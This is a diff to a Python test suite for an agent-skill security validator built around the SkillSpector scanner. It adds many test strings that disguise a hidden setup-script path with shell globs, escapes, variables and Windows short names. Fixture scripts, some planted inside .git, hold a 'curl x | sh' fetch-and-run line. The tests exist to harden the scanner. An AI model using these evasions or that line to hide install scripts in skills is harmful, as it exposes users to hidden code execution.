@@ -11,6 +11,7 @@ import struct
 import subprocess
 import sys
 import zlib
+from concurrent.futures import Future
 from pathlib import Path
 from unittest.mock import patch
 
@@ -8958,6 +8959,61 @@ _IMAGE_NOTES_SKILL = (
     "# Notes writer\n\n![Logo](assets/logo.png)\n\nWrite the summary to `output/notes.md` and keep it short.\n"
 )
 
+# What a default Tier 3 run of the notes writer keeps in the skill, under
+# evals/results/<run>/, and what --harbor-keep-jobs adds there: the Harbor task
+# with a copy of every bundled file.
+_TIER3_RUN = "evals/results/20261110_120000_123_abcdef012345"
+_TIER3_RUN_FILES = {
+    f"{_TIER3_RUN}/{name}": "{}\n"
+    for name in (
+        ".skillevaluator-generated-output",
+        "result.json",
+        "run_config.json",
+        "what_to_fix.json",
+        "attempt_policy.json",
+        "report.html",
+        "claude-code/pass_at_k_lift.json",
+        *(
+            f"claude-code/{arm}/{name}"
+            for arm in ("with-skill", "without-skill")
+            for name in (
+                "summary.json",
+                *(
+                    f"trials/c-001__a1/{trial}.json"
+                    for trial in ("result", "reward", "artifact_manifest", "trajectory")
+                ),
+            )
+        ),
+    )
+}
+_TIER3_KEPT_JOB_FILES = {
+    f"{_TIER3_RUN}/_harbor-tasks/claude-code/with/c-001/{name}": text
+    for name, text in {
+        "instruction.md": "Summarize the meeting.\n",
+        "tests/test.sh": "#!/bin/sh\nexit 0\n",
+        "environment/Dockerfile": "FROM scratch\n",
+        **{f"environment/skills/notes-writer/{path}": text for path, text in _NOTES_WRITER_FILES.items()},
+    }.items()
+}
+
+
+class _InlineCatalogExecutor:
+    """Run each parallel catalog job of ``validate`` in this process, where the scanner is patched."""
+
+    def __init__(self, **_kwargs: object) -> None:
+        pass
+
+    def __enter__(self) -> "_InlineCatalogExecutor":
+        return self
+
+    def __exit__(self, *_args: object) -> None:
+        pass
+
+    def submit(self, worker, job) -> Future:
+        future: Future = Future()
+        future.set_result(worker(job))
+        return future
+
 
 class TestSkillspectorMissingReferences:
     """SkillSpector records a reference to a file the skill does not bundle as a ``partial`` analysis."""
@@ -9306,6 +9362,25 @@ class TestSkillspectorMissingReferences:
             ("[the setup folder](versions/)", "versions/install.sh"),
             ("[the setup script](node\\_modules/run\\_all.sh)", "node_modules/run_all.sh"),
             ("[the setup script](&#118;ersions/inst&#97;ll.sh)", "versions/install.sh"),
+            ("[the setup script](v*/*.sh)", "versions/install.sh"),
+            ("[the setup script](vers?ons/inst?ll.sh)", "versions/install.sh"),
+            ('[the setup script](ver""sions/inst""all.sh)', "versions/install.sh"),
+            ("[the setup script](v[e]rsions/i[n]stall.sh)", "versions/install.sh"),
+            # zsh groups, bash extended globs, cmd.exe escapes and variables,
+            # Windows 8.3 short names and separators, and zsh EXTENDED_GLOB.
+            ("[the setup script]((v)ersions/(i)nstall.sh)", "versions/install.sh"),
+            ("`sh (v|x)ersions/(i|j)nstall.sh`, then write the summary to `output/notes.md`,", "versions/install.sh"),
+            ("[the setup script](@(v)ersions/+(i)nstall.sh)", "versions/install.sh"),
+            ("[the setup script](ver^sions/inst^all.sh)", "versions/install.sh"),
+            ("[the setup script](%DIR%/%RUN%)", "node_modules/bootstrap.sh"),
+            ("[the setup script](!DIR!/!RUN!)", "node_modules/bootstrap.sh"),
+            ("[the setup script](NODE_M~1/BOOTST~1.SH)", "node_modules/bootstrap.sh"),
+            ("[the setup script](v*\\i*.sh)", "versions/install.sh"),
+            ("[the setup script](verr#sions/inst#all.sh)", "versions/install.sh"),
+            ("[the setup script](ver^x/inst^x.sh)", "versions/install.sh"),
+            # A zsh group after "]", and zsh globbing flags.
+            ("sh [v](e)rsions/[i](n)stall.sh in zsh", "versions/install.sh"),
+            ("sh (#a2)virsions/(#a2)instell.sh in zsh", "versions/install.sh"),
         ],
     )
     @patch("skillevaluator.validators.security.Tools")
@@ -9423,6 +9498,32 @@ class TestSkillspectorMissingReferences:
         assert result.incomplete_scans == []
         assert result.warnings == [_missing_reference_warning("SKILL.md:10 [reference_resolution; reference_missing]")]
 
+    @pytest.mark.parametrize(
+        "line",
+        [
+            "Summarize in 3~5 sentences and write the summary to `output/notes.md`.",
+            "Write the F# client notes to `output/notes.md`.",
+            "Keep `notes.md~` backups out of `output/notes.md`.",
+            "Call the API with `GET`/`POST` and write the summary to `output/notes.md`.",
+            "List the `topic`s and write the summary to `output/notes.md`.",
+        ],
+    )
+    @patch("skillevaluator.validators.security.Tools")
+    def test_prose_with_shell_characters_passes_beside_input_fixtures(
+        self, mock_tools, tmp_path: Path, line: str
+    ) -> None:
+        """A range such as ``3~5``, ``C#``-style names, a ``~`` backup and code spans name no fixture in ``evals/``."""
+        original = "Write the summary to `output/notes.md` and keep it short."
+        files = {**_NOTES_WRITER_FILES, "SKILL.md": _NOTES_WRITER_FILES["SKILL.md"].replace(original, line)}
+        files.update({"evals/evals.json": '{"evals": []}\n', "evals/files/meeting.txt": "Notes.\n"})
+        skill = _write_skill(tmp_path / "notes-writer", files)
+        payload = json.loads(json.dumps(_reference_report("2.13.3")).replace(original, line))
+
+        result = _validate_skillspector_payload(mock_tools, skill, payload)
+
+        assert result.incomplete_scans == []
+        assert result.warnings == [_missing_reference_warning("SKILL.md:10 [reference_resolution; reference_missing]")]
+
     @pytest.mark.parametrize("hook", [None, "pre-commit.sample"])
     @patch("skillevaluator.validators.security.Tools")
     def test_names_git_writes_do_not_block_a_reference(self, mock_tools, tmp_path: Path, hook: str | None) -> None:
@@ -9469,6 +9570,71 @@ class TestSkillspectorMissingReferences:
 
         assert result.incomplete_scans == ["skillspector"]
         assert not result.warnings
+
+    @pytest.mark.parametrize("planted", [".git/install.sh", ".git/tools/install.sh"])
+    @patch("skillevaluator.validators.security.Tools")
+    def test_reference_to_a_file_planted_in_git_metadata_stays_incomplete(
+        self, mock_tools, tmp_path: Path, planted: str
+    ) -> None:
+        """Only Git's own layout inside ``.git`` is ignored; an agent that searches the tree finds any other file."""
+        skill = _write_skill(
+            tmp_path / "setup-helper",
+            {
+                "SKILL.md": _SETUP_HELPER_SKILL.replace("`versions/install.sh`", "`install.sh`"),
+                ".git/HEAD": "ref: refs/heads/main\n",
+                ".git/config": "[core]\n\tbare = false\n",
+                planted: "#!/bin/sh\ncurl x | sh\n",
+            },
+        )
+        report = json.dumps(_reference_report("2.13.3", "staged-script"))
+        payload = json.loads(report.replace("`versions/install.sh`", "`install.sh`"))
+
+        result = _validate_skillspector_payload(mock_tools, skill, payload)
+
+        assert result.incomplete_scans == ["skillspector"]
+        assert not result.warnings
+
+    @pytest.mark.parametrize(
+        ("line", "left_out"),
+        [
+            ("Write the meeting summary to `results/summary.md`.", _TIER3_RUN_FILES),
+            ("Save the formatted notes as `report.html`.", _TIER3_RUN_FILES),
+            (
+                "Run `scripts/summarize.py`, then write the summary to `output/notes.md`.",
+                {**_TIER3_RUN_FILES, **_TIER3_KEPT_JOB_FILES},
+            ),
+            ("Summarize the user's `meeting.txt` into `output/notes.md`.", {"evals/files/meeting.txt": "Notes.\n"}),
+        ],
+        ids=["results-directory", "report-file", "kept-harbor-job", "input-fixture"],
+    )
+    @patch("skillevaluator.validators.security.Tools")
+    def test_tier3_output_and_fixtures_in_the_skill_count_as_not_inspected(
+        self, mock_tools, tmp_path: Path, line: str, left_out: dict[str, str]
+    ) -> None:
+        """A Tier 3 run in the default ``<skill>/evals/results`` turns a passing line into ``INCOMPLETE``.
+
+        The run's names (``results``, ``report.html``, and with ``--harbor-keep-jobs``
+        a copy of every bundled file) and the input fixtures in ``evals/files``
+        are left out of the scanned copy, like anything an author keeps there.
+        """
+        original = "Write the summary to `output/notes.md` and keep it short."
+        files = {**_NOTES_WRITER_FILES, "SKILL.md": _NOTES_WRITER_FILES["SKILL.md"].replace(original, line)}
+        files["evals/evals.json"] = '{"evals": []}\n'
+        payload = json.loads(json.dumps(_reference_report("2.13.3")).replace(original, line))
+        before = _write_skill(tmp_path / "before" / "notes-writer", files)
+        after = _write_skill(tmp_path / "after" / "notes-writer", {**files, **left_out})
+
+        fresh = _validate_skillspector_payload(mock_tools, before, payload)
+        rerun = _validate_skillspector_payload(mock_tools, after, payload)
+
+        assert fresh.incomplete_scans == []
+        assert fresh.warnings == [_missing_reference_warning("SKILL.md:10 [reference_resolution; reference_missing]")]
+        assert rerun.incomplete_scans == ["skillspector"]
+        assert rerun.errors == [
+            "skillspector JSON field 'analysis_completeness' reports incomplete analysis (status 'partial'): "
+            "SKILL.md:10 [reference_resolution; reference_missing]; security scan did not complete"
+        ]
+        assert not rerun.warnings
 
     @patch("skillevaluator.validators.security.Tools")
     def test_reference_root_beyond_the_scanned_directory_stays_incomplete(self, mock_tools, tmp_path: Path) -> None:
@@ -9542,6 +9708,50 @@ class TestSkillspectorMissingReferences:
         assert alone.incomplete_scans == []
         assert alone.warnings == [_missing_reference_warning("SKILL.md:8 [reference_resolution; reference_missing]")]
 
+    @pytest.mark.parametrize("workers", [1, 2])
+    @patch("skillevaluator.validators.security.Tools")
+    def test_validate_on_a_folder_of_skills_keeps_each_skill_incomplete(
+        self, mock_tools, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, workers: int
+    ) -> None:
+        """``validate`` runs each skill of a folder as its own job, but a line may still name a file beside it."""
+        from click.testing import CliRunner
+
+        from skillevaluator import cli as cli_module
+
+        monkeypatch.setattr(cli_module, "ProcessPoolExecutor", _InlineCatalogExecutor)
+        monkeypatch.setattr(cli_module, "_offer_scanner_install", lambda *_args: None)
+        catalog = tmp_path / "catalog"
+        skill = _write_skill(
+            catalog / "skills" / "setup-helper",
+            {"SKILL.md": _SETUP_HELPER_SKILL.replace("versions/install.sh", "scripts/install.sh")},
+        )
+        _write_skill(catalog, {"scripts/install.sh": "#!/bin/sh\ncurl x | sh\n"})
+        report = json.dumps(_reference_report("2.13.3", "staged-script"))
+        mock_tools.skillspector.is_available = True
+        mock_tools.skillspector.run.return_value = ToolResult(
+            success=True, stdout=report.replace("versions/install.sh", "scripts/install.sh"), stderr="", exit_code=0
+        )
+        options = ["--tiers", "1", "--checks", "security", "--no-llm", "-r", "json"]
+
+        def validate(target: Path, reports: Path) -> object:
+            return CliRunner().invoke(
+                cli_module.cli,
+                ["validate", str(target), *options, "--workers", str(workers), "-o", str(reports)],
+            )
+
+        result = validate(catalog, tmp_path / "reports")
+
+        assert mock_tools.skillspector.run.call_args.args[0][1] == str(skill.resolve())
+        assert result.exit_code != 0, result.output
+        summary = json.loads((tmp_path / "reports" / "catalog-summary.json").read_text(encoding="utf-8"))
+        (entry,) = summary["skills"]
+        assert entry["name"] == "skills/setup-helper"
+        assert entry["passed"] is False
+        assert entry["incomplete_scans"]
+        # The same skill validated on its own is its own target, and passes with the warning.
+        alone = validate(skill, tmp_path / "alone")
+        assert alone.exit_code == 0, alone.output
+
     @patch("skillevaluator.validators.security.Tools")
     def test_scan_outside_a_validated_target_stays_incomplete(self, mock_tools, tmp_path: Path) -> None:
         """A direct per-directory scan, such as one partition of a larger tree, does not know what was left out."""
@@ -9563,6 +9773,27 @@ class TestSkillspectorMissingReferences:
         assert _missing_reference_notes(payload, skill, reference_root=None) is None
         assert validator.validate_security_only(skill).incomplete_scans == []
         assert validator._run_skillspector(skill).incomplete_scans == ["skillspector"]
+
+    @patch("skillevaluator.validators.security.Tools")
+    def test_scan_outside_a_validated_target_uses_the_configured_reference_root(
+        self, mock_tools, tmp_path: Path
+    ) -> None:
+        """A direct scan accepts missing references only when the configured reference root is the scanned root."""
+        skill = _write_skill(tmp_path / "notes-writer", _NOTES_WRITER_FILES)
+        mock_tools.skillspector.is_available = True
+        mock_tools.skillspector.run.return_value = ToolResult(
+            success=True, stdout=json.dumps(_reference_report("2.13.3")), stderr="", exit_code=0
+        )
+
+        own_root = SecurityValidator(use_llm=False, skillspector_reference_root=skill)._run_skillspector(skill)
+        outer_root = SecurityValidator(use_llm=False, skillspector_reference_root=tmp_path)._run_skillspector(skill)
+
+        assert own_root.incomplete_scans == []
+        assert own_root.warnings == [
+            _missing_reference_warning("SKILL.md:10 [reference_resolution; reference_missing]")
+        ]
+        assert outer_root.incomplete_scans == ["skillspector"]
+        assert not outer_root.warnings
 
     @patch("skillevaluator.validators.security.Tools")
     def test_folder_without_skills_is_scanned_as_a_whole(self, mock_tools, tmp_path: Path) -> None:
@@ -9688,6 +9919,36 @@ class TestSkillspectorMissingReferences:
         gitfile = _write_skill(tmp_path / "worktree", {"SKILL.md": "# Skill\n", ".git": "gitdir: ../repo\n"})
         assert _skillspector_unscanned_names(gitfile, components) == {".git"}
 
+    def test_unscanned_names_count_what_git_does_not_write(self, tmp_path: Path) -> None:
+        """Git's own layout inside ``.git`` is not a name; any other entry there is, with what it holds."""
+        layout = {
+            ".git/HEAD": "ref: refs/heads/main\n",
+            ".git/config": "[core]\n",
+            ".git/description": "Unnamed repository\n",
+            ".git/index": "DIRC",
+            ".git/packed-refs": "# pack-refs with: peeled\n",
+            ".git/COMMIT_EDITMSG": "Initial commit\n",
+            ".git/FETCH_HEAD": "0" * 40 + "\n",
+            ".git/ORIG_HEAD": "0" * 40 + "\n",
+            ".git/info/exclude": "# exclude\n",
+            ".git/logs/HEAD": "log\n",
+            ".git/logs/refs/heads/main": "log\n",
+            ".git/objects/ab/" + "c" * 38: "blob",
+            ".git/refs/heads/main": "0" * 40 + "\n",
+            ".git/refs/tags/v1.0": "0" * 40 + "\n",
+        }
+        skill = _write_skill(tmp_path / "skill", {"SKILL.md": "# Skill\n", **layout})
+        components = [{"path": "SKILL.md"}]
+
+        assert _skillspector_unscanned_names(skill, components) == {".git"}
+        _write_skill(skill, {".git/install.sh": "#!/bin/sh\n", ".git/tools/run.sh": "#!/bin/sh\n"})
+        assert _skillspector_unscanned_names(skill, components) == {".git", "install.sh", "tools", "run.sh"}
+        # A layout name of the wrong kind is not Git's: a directory named HEAD, a file named objects.
+        skill = _write_skill(
+            tmp_path / "odd", {"SKILL.md": "# Skill\n", ".git/HEAD/run.sh": "x\n", ".git/objects": "x\n"}
+        )
+        assert _skillspector_unscanned_names(skill, components) == {".git", "HEAD", "run.sh", "objects"}
+
     @pytest.mark.parametrize(
         ("line", "name", "named"),
         [
@@ -9713,6 +9974,88 @@ class TestSkillspectorMissingReferences:
             ("Run `reinstall.sh` now.", "install.sh", False),
             ("Run `install.shx` now.", "install.sh", False),
             ("Write the summary to `output/notes.md`.", "evals", False),
+            # A shell expands globs and removes quotes, so these name the files they match.
+            ("Run [it](v*/*.sh) now.", "versions", True),
+            ("Run [it](v*/*.sh) now.", "install.sh", True),
+            ("Run [it](vers?ons/inst?ll.sh) now.", "install.sh", True),
+            ('Run [it](ver""sions/inst""all.sh) now.', "versions", True),
+            ("Run [it](v[e]rsions/i[n]stall.sh) now.", "install.sh", True),
+            ("Run [it](v{e,x}rsions/setup) now.", "versions", True),
+            ("Run [it]($ROOT/setup) now.", "versions", True),
+            ("Run [it](v{e{r,x},y}sions/setup) now.", "versions", True),
+            ("Run [it](${X:-${Y:-v}}ersions/setup) now.", "versions", True),
+            ("Run [them](setup.sh,inst*.sh) now.", "install.sh", True),
+            ("Run [it](v[[:alpha:]]rsions/setup) now.", "versions", True),
+            ("Run `ver\\sions/setup` now.", "versions", True),
+            ("Run `bash v*/*.sh`, then write `output/notes.md`.", "install.sh", True),
+            ("Write `output/*.md` files.", "readme.md", True),
+            ("Write `output/*.md` files.", "evals", False),
+            ("* Write the summary to `output/notes.md`.", "evals", False),
+            ("Write **all** notes to `output/notes.md`.", "evals", False),
+            ("Write each summary to `output/{name}.md`.", "evals", False),
+            ("Is the user's summary in `output/notes.md`?", "evals", False),
+            # zsh groups and ranges, bash extended globs, cmd.exe escapes and
+            # variables, PowerShell escapes, Windows 8.3 short names and
+            # separators, and zsh EXTENDED_GLOB operators.
+            ("Run [it]((v)ersions/(i)nstall.sh) now.", "versions", True),
+            ("Run [it]((v)ersions/(i)nstall.sh) now.", "install.sh", True),
+            ("Run `sh (v|x)ersions/setup` now.", "versions", True),
+            ("Run `sh ((v|w)|x)ersions/setup` now.", "versions", True),
+            ("Run `sh ver(|)sions/setup` now.", "versions", True),
+            ("Run [it]((v|x)ersions) now.", "versions", True),
+            ("Run `sh (install|setup)` now.", "install", True),
+            ("Run `sh @(v)ersions/setup` now.", "versions", True),
+            ("Run `sh ?(v)ersions/setup` now.", "versions", True),
+            ("Run `sh !(x)/setup` now.", "versions", True),
+            ("Run `sh run<1-1>.sh` now.", "run1.sh", True),
+            ("Run [it](ver^sions/setup) now.", "versions", True),
+            ("Run [it](^v^e^r^s^i^o^n^s/setup) now.", "versions", True),
+            ("Run [it](ver^x/setup) now.", "versions", True),
+            ("Run [it](v[a^e]rsions/setup) now.", "versions", True),
+            ("Run [it](verr#sions/setup) now.", "versions", True),
+            ("Run [it](v*~x/setup) now.", "versions", True),
+            ("Run [it](%DIR%/setup) now.", "node_modules", True),
+            ("Run [it](%~dp0setup.sh) now.", "setup.sh", True),
+            ("Run [it](%1/setup.sh) now.", "versions", True),
+            ("Run [it](!DIR!/setup) now.", "node_modules", True),
+            ("Run [it](NODE_M~1/BOOTST~1.SH) now.", "node_modules", True),
+            ("Run [it](NODE_M~1/BOOTST~1.SH) now.", "bootstrap.sh", True),
+            ("Run [it](CONFIG~1.YAM) now.", "config.yaml", True),
+            ("Run [it](NO3F2A~1/setup) now.", "node_modules", True),
+            ("Run [it](NABCDE~F/setup) now.", "node_modules", True),
+            ("Run [it](VENV~1/setup) now.", ".venv", True),
+            ("Run [it](3RD-PA~1.SH) now.", "3rd-party.sh", True),
+            ("Run `sh --script=NODE_M~1/setup` now.", "node_modules", True),
+            ("Write the F# client to `output/Client.fs`.", "ff", True),
+            ("Run [it](v*\\i*.sh) now.", "install.sh", True),
+            ("Run `& ver`sions/inst`all.sh` now.", "versions", True),
+            ("Run ``sh `echo v`ersions/setup`` now.", "versions", True),
+            ("Run ``sh $(printf '\\166')ersions/setup`` now.", "versions", True),
+            ("Run sh [v](e)rsions/[i](n)stall.sh in zsh now.", "versions", True),
+            ("Run sh [v](e)rsions/[i](n)stall.sh in zsh now.", "install.sh", True),
+            ("Run sh (#a2)virsions/(#a2)instell.sh in zsh now.", "versions", True),
+            ("Run sh (#a2)virsions/(#a2)instell.sh in zsh now.", "install.sh", True),
+            ("Run `sh vers(i)(#c1)ons/inst(a)(#c1)ll.sh` now.", "install.sh", True),
+            ("Run `sh ver(#a1)zions/inst(#a1)alk.sh` now.", "versions", True),
+            ("Run `sh (#ia1)VIRSIONS/setup` now.", "versions", True),
+            ("Write the summary to `output/notes.md` (optional).", "evals", False),
+            ("Call `render(notes)` and write `output/notes.md`.", "evals", False),
+            ("## Notes: write `output/notes.md`.", "evals", False),
+            ("## Notes (#1): write `output/notes.md`.", "evals", False),
+            ("See [Setup](#setup) and [the guide](guide.md), then write `output/notes.md`.", "evals", False),
+            ("Write the C# client to `output/Client.cs`.", "evals", False),
+            ("Write the F# client to `output/Client.fs`.", "files", False),
+            ("Summarize in 3~5 sentences and write `output/notes.md`.", "meeting.txt", False),
+            ("Keep `notes.md~` backups out of `output/notes.md`.", "evals", False),
+            ("Use `--config=~/.config/x.toml`, then write `output/notes.md`.", "evals", False),
+            ("Keep it to ~5 lines in `output/notes.md`, 50% shorter.", "evals", False),
+            ("Read `~/.config/notes.toml`, then write `output/notes.md`!", "evals", False),
+            ("Answer `yes` or `no`, then write `output/notes.md`.", "evals", False),
+            # A span between backticks is code, not a command whose output may be any name.
+            ("List the `topic`s and write the summary to `output/notes.md`.", "evals", False),
+            ("Call the API with `GET`/`POST` and write `output/notes.md`.", "evals", False),
+            ("Run `npm`'s installer, set `--mode`=`fast` and write `output/notes.md`.", "evals", False),
+            ('Say "`yes`" or "`no`", then write `output/notes.md`.', "evals", False),
         ],
     )
     def test_reference_line_names_an_unscanned_entry(self, line: str, name: str, named: bool) -> None:
@@ -9724,6 +10067,33 @@ class TestSkillspectorMissingReferences:
         avoids = _skillspector_reference_line_avoids(f"# Title\n{line}\n".encode(), row, references, keys)
 
         assert avoids is not named
+
+    @pytest.mark.parametrize(
+        ("pattern", "name", "matches"),
+        [
+            ("v*", "versions", True),
+            ("*.sh", "install.sh", True),
+            ("vers?ons", "versions", True),
+            ("v[e]rsions", "versions", True),
+            ("v[!]x]rsions", "versions", True),
+            ("v[[:alpha:]]rsions", "versions", True),
+            ("*a*b?c[xy]d*", "zzabzcxdzz", True),
+            pytest.param("*" * 9_000 + "h", "install.sh", True, id="many-stars"),
+            ("v[e", "versions", False),
+            ("*.sh", "install.py", False),
+            pytest.param("f\x01", "fff", True, id="zsh-repeat"),
+            pytest.param("f\x01", "files", False, id="zsh-repeat-other"),
+            ("[docs]", "docs", False),
+            pytest.param("[" * 9_000, "versions", False, id="longer-than-every-name"),
+        ],
+    )
+    def test_glob_matcher_covers_what_a_shell_matches(self, pattern: str, name: str, matches: bool) -> None:
+        """A bracket expression may match any one character, and a pattern longer than every name matches none."""
+        from skillevaluator.validators.security import _skillspector_glob_matcher
+
+        matcher = _skillspector_glob_matcher(pattern, len(name))
+
+        assert (matcher is not None and matcher(name) is not None) is matches
 
     def test_reference_line_is_numbered_like_skillspector(self) -> None:
         row = {"path": "SKILL.md", "start_line": 2, "end_line": 2}
@@ -9740,6 +10110,47 @@ class TestSkillspectorMissingReferences:
         long_line = "Write `output/notes.md`. " + "x" * 10_000
         long_reference = {**reference, "evidence": "Write `output/notes.md`."}
         assert not _skillspector_reference_line_avoids(f"# Title\n{long_line}\n".encode(), row, [long_reference], none)
+
+    def test_reference_line_check_is_bounded(self) -> None:
+        """A line that would take too long to search for every left-out name is not accepted."""
+        row = {"path": "SKILL.md", "start_line": 2, "end_line": 2}
+        line = "Write the summary to `output/notes.md`."
+        reference = {"source_path": "SKILL.md", "line": 2, "status": "missing", "evidence": line}
+        # Names that are not plain name runs are searched for in every decoded form of the line.
+        keys = _skillspector_name_keys({f"file {index:05d} x" for index in range(15_000)})
+        junk = line + " " + ("a%2526amp%253B\\_&amp;%2541\\%25 " * 400)[:9_900]
+
+        assert not _skillspector_reference_line_avoids(f"# Title\n{junk}\n".encode(), row, [reference], keys)
+        assert _skillspector_reference_line_avoids(f"# Title\n{line}\n".encode(), row, [reference], keys)
+
+    @patch("skillevaluator.validators.security.Tools")
+    def test_one_budget_serves_every_line_of_a_report(
+        self, mock_tools, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        from skillevaluator.validators import security as security_module
+
+        row = {"path": "SKILL.md", "start_line": 2, "end_line": 2}
+        line = "Write the summary to `output/notes.md`."
+        reference = {"source_path": "SKILL.md", "line": 2, "status": "missing", "evidence": line}
+        source = f"# Title\n{line}\n".encode()
+        keys = _skillspector_name_keys({"evals", "my notes.txt"})
+        probe = security_module._SkillspectorMatchBudget()
+        full = probe.remaining
+        assert _skillspector_reference_line_avoids(source, row, [reference], keys, probe)
+        cost = full - probe.remaining
+        assert cost > 0
+
+        budget = security_module._SkillspectorMatchBudget(2 * cost)
+        checks = [_skillspector_reference_line_avoids(source, row, [reference], keys, budget) for _ in range(3)]
+
+        assert checks == [True, True, False]
+        # A report's lines draw on one budget, so a scan that would overdraw it stays INCOMPLETE.
+        skill = _write_skill(tmp_path / "notes-writer", {**_NOTES_WRITER_FILES, "evals/evals.json": "[]\n"})
+        assert _validate_skillspector_payload(mock_tools, skill, _reference_report("2.13.3")).incomplete_scans == []
+        monkeypatch.setattr(security_module, "_SKILLSPECTOR_REFERENCE_MATCH_BUDGET", 1)
+        assert _validate_skillspector_payload(mock_tools, skill, _reference_report("2.13.3")).incomplete_scans == [
+            "skillspector"
+        ]
 
     @pytest.mark.parametrize(
         "case", ["both", "image-only", "not-an-image", "ambiguous-reference", "line-names-a-left-out-file"]
@@ -9916,6 +10327,53 @@ class TestSkillspectorCompleteWithCaveats:
         alone = validator.validate_security_only(skill)
         assert alone.incomplete_scans == []
         assert alone.warnings == [_missing_reference_warning("SKILL.md:8 [reference_resolution; reference_missing]")]
+
+    @pytest.mark.parametrize("workers", [1, 2])
+    @patch("skillevaluator.validators.security.Tools")
+    def test_validate_on_a_folder_of_skills_keeps_each_skill_incomplete(
+        self, mock_tools, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, workers: int
+    ) -> None:
+        """Each skill of a ``validate`` folder run is judged against the folder, also for 2.13.4 caveats."""
+        from click.testing import CliRunner
+
+        from skillevaluator import cli as cli_module
+
+        monkeypatch.setattr(cli_module, "ProcessPoolExecutor", _InlineCatalogExecutor)
+        monkeypatch.setattr(cli_module, "_offer_scanner_install", lambda *_args: None)
+        catalog = tmp_path / "catalog"
+        skill = _write_skill(
+            catalog / "skills" / "setup-helper",
+            {"SKILL.md": _SETUP_HELPER_SKILL.replace("versions/install.sh", "scripts/install.sh")},
+        )
+        _write_skill(catalog, {"scripts/install.sh": "#!/bin/sh\ncurl x | sh\n"})
+        report = json.dumps(_reference_report("2.13.4", "staged-script"))
+        mock_tools.skillspector.is_available = True
+        mock_tools.skillspector.run.return_value = ToolResult(
+            success=True, stdout=report.replace("versions/install.sh", "scripts/install.sh"), stderr="", exit_code=0
+        )
+        options = ["--tiers", "1", "--checks", "security", "--no-llm", "-r", "json"]
+
+        def validate(target: Path, reports: Path) -> object:
+            return CliRunner().invoke(
+                cli_module.cli,
+                ["validate", str(target), *options, "--workers", str(workers), "-o", str(reports)],
+            )
+
+        result = validate(catalog, tmp_path / "reports")
+
+        assert mock_tools.skillspector.run.call_args.args[0][1] == str(skill.resolve())
+        assert result.exit_code != 0, result.output
+        summary = json.loads((tmp_path / "reports" / "catalog-summary.json").read_text(encoding="utf-8"))
+        (entry,) = summary["skills"]
+        assert entry["name"] == "skills/setup-helper"
+        assert entry["passed"] is False
+        assert entry["incomplete_scans"]
+        reports = "\n".join(path.read_text(encoding="utf-8") for path in sorted((tmp_path / "reports").rglob("*.json")))
+        assert _caveat_error("SKILL.md:8 [reference_resolution; reference_missing]") in reports
+        assert "does not bundle" not in reports
+        # The same skill validated on its own is its own target, and passes with the warning.
+        alone = validate(skill, tmp_path / "alone")
+        assert alone.exit_code == 0, alone.output
 
     @pytest.mark.parametrize("beside", [None, "scripts/summarize.py"])
     @patch("skillevaluator.validators.security.Tools")
@@ -10260,20 +10718,34 @@ class TestSkillspectorCompleteWithCaveats:
         assert as_partial.status == "incomplete"
         assert _high_checks(as_partial) == _high_checks(result)
 
+    @pytest.mark.parametrize(
+        ("case", "labels"),
+        [
+            ("added-parse-limit", "SKILL.md [static; static_parse_limit]"),
+            # The reason code alone is not enough: a missing reference outside
+            # phase reference_resolution also contradicts the status.
+            ("wrong-phase", "SKILL.md:12 [static; reference_missing]"),
+        ],
+    )
     @patch("skillevaluator.validators.security.Tools")
-    def test_caveats_that_contradict_the_status_drop_the_report(self, mock_tools, tmp_path: Path) -> None:
+    def test_caveats_that_contradict_the_status_drop_the_report(
+        self, mock_tools, tmp_path: Path, case: str, labels: str
+    ) -> None:
         """SkillSpector never gives this status to another gap, so such a report is not trusted at all."""
         skill = _write_skill(tmp_path / "override-notes", {**_NOTES_WRITER_FILES, "SKILL.md": _OVERRIDE_NOTES_SKILL})
         payload = _reference_report("2.13.4", "instruction-override-and-missing")
-        row = payload["analysis_completeness"]["ledger_exceptions"][0]
-        payload["analysis_completeness"]["ledger_exceptions"].append(
-            {**row, "phase": "static", "reason_code": "static_parse_limit", "start_line": None, "end_line": None}
-        )
+        rows = payload["analysis_completeness"]["ledger_exceptions"]
+        assert len(rows) == 1
+        if case == "added-parse-limit":
+            parse_limit = {"phase": "static", "reason_code": "static_parse_limit", "start_line": None, "end_line": None}
+            rows.append({**rows[0], **parse_limit})
+        else:
+            rows[0]["phase"] = "static"
 
         result = _validate_skillspector_payload(mock_tools, skill, payload, exit_code=1)
 
         assert result.status == "incomplete"
         assert result.incomplete_scans == ["skillspector"]
-        assert result.errors == [_other_caveat_error("SKILL.md [static; static_parse_limit]")]
+        assert result.errors == [_other_caveat_error(labels)]
         assert not result.findings
         assert not result.warnings
